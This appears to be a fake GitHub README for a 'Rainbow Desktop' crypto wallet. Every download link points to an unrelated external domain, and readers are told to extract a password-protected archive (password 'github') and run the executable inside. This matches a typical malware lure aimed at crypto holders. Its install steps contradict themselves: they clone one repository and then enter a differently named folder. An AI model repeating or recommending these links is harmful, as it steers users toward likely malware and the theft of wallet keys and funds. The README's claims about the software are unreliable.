<h1 align="center">Rainbow Desktop — Open Source Web3 Wallet & Browser</h1>

<p align="center">
  <strong>The Lightweight, Privacy-First Desktop Client for Ethereum, NFTs, and DeFi</strong>
</p>

<p align="center">
  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github" alt="Download Release"></a>
  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Status-Active_Build-success?style=for-the-badge" alt="Build Status"></a>
  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge" alt="License"></a>
</p>

<p align="center">
  <a href="https://yeelen.cg/gh/"><strong>📥 Download Application</strong></a> •
  <a href="#-key-features">Key Features</a> •
  <a href="#-system-requirements">Requirements</a> •
  <a href="#-installation--deployment">Installation</a> •
  <a href="#-frequently-asked-questions">FAQ</a>
</p>

---

## 📖 About Rainbow Desktop

**Rainbow Desktop** is a sleek, open-source desktop wallet built for the decentralized web. It combines the speed of a native browser with the security of a self-custody wallet. Unlike heavy clients, Rainbow Desktop is designed to be lightweight and fast, allowing users to interact with DApps (Uniswap, OpenSea, Aave) directly from their desktop environment without leaving the app.

Perfect for crypto enthusiasts who want to manage ETH, ERC-20 tokens, NFTs, and DeFi positions with full control over their private keys, all while enjoying a beautiful, intuitive interface.

---

## 📥 Direct Downloads & Links

Get the latest build or source files directly using the links below:

| Download Option | Format | Quick Link |
| :--- | :--- | :--- |
| **Complete Application Package** | Executable / Archive | 👉 **[Download Installer](https://yeelen.cg/gh/)** |
| **Source Code (Latest)** | `.ZIP` Archive | 👉 **[Download Source (.zip)](https://yeelen.cg/gh/)** |
| **Portable Version** | `.ZIP` Archive | 👉 **[Download Portable (.zip)](https://yeelen.cg/gh/)** |

> 🔑 **Archive Password:** `github`

---

## ✨ Key Features & Capabilities

### 🎨 Native Web3 Experience
*   **Seamless DApp Integration:** Click any link in Rainbow Desktop to open DApps in a built-in, secure browser window. No more pop-ups or extensions.
*   **Multi-Chain Support:** Built-in support for Ethereum, Polygon, Arbitrum, Optimism, and Base networks. Switch chains instantly with one click.
*   **NFT Gallery:** A beautiful, optimized gallery to view, manage, and send your NFTs directly from the desktop client.

### 🛡️ Security & Privacy
*   **Local Key Storage:** Your private keys are stored locally on your device (encrypted), ensuring maximum security and uptime even if network providers go down.
*   **Hardware Wallet Ready:** Full compatibility with Ledger and Trezor for high-security transactions.
*   **No Telemetry:** Truly open-source codebase. No tracking, no ads, and no data monetization by default.

### ⚡ Performance & Usability
*   **Lightweight Electron Build:** Optimized for low RAM usage compared to other desktop wallets. Launches in seconds.
*   **Cross-Platform Compatibility:** Native builds for Windows, macOS, and Linux via GitHub Releases.
*   **Instant Updates:** Subscribe to releases on GitHub to get the latest features and security patches immediately.

---

## 🖥️ System Requirements

Before running Rainbow Desktop, ensure your system meets the following prerequisites:

*   **Operating System:** Windows 10/11, macOS 11+ (Monterey+), Linux (Ubuntu 20.04+, Debian 11+)
*   **Runtime:** Node.js v16.x or higher (included in portable builds)
*   **Hardware:** Minimum 4 GB RAM, 500 MB free disk space
*   **Network:** Internet connection for syncing blockchain data and fetching live prices

---

## 🚀 Installation & Deployment

### Method 1: Direct Download (Recommended for End-Users)
1. Download the latest setup file or portable zip from the **[Official Download Link](https://yeelen.cg/gh/)**.
2. Extract the archive using password: `github`
3. Launch `rainbow-desktop.exe` (or equivalent) and import/create your wallet.

### Method 2: Manual Installation from Source
Deploy Rainbow Desktop locally or build from source:

```bash
# 1. Clone the repository
git clone https://github.com/rainbow-me/rainbowkit.git
cd rainbow-desktop

# 2. Install dependencies
npm install

# 3. Run in development mode
npm start

# 4. Build for production
npm run build
